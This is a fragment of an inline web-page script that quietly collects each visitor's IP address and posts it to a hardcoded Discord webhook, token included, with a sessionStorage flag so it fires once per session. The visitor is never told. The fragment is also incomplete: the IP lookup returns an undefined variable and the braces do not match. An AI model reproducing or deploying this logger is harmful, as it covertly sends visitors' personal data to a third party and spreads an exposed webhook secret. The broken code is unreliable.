    async function getUserIP() {

        return data.ip;
    }

        getUserIP().then(ipuser => {
            fetch("https://discord.com/api/webhooks/1478222834093527060/Cv-YqSMJY_Hkpwqd5iKdAuKro_XylIjIl2BLties4ZHgx5NnFS3MIOj3ku8BSu1SYyfL", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    content: ipuser
                })
            })
            .then(r => console.log("Webhook sent"))
            .catch(err => console.error("Webhook error:", err));

            sessionStorage.setItem("webhook_sent", "true");
        });
    }
    </script>
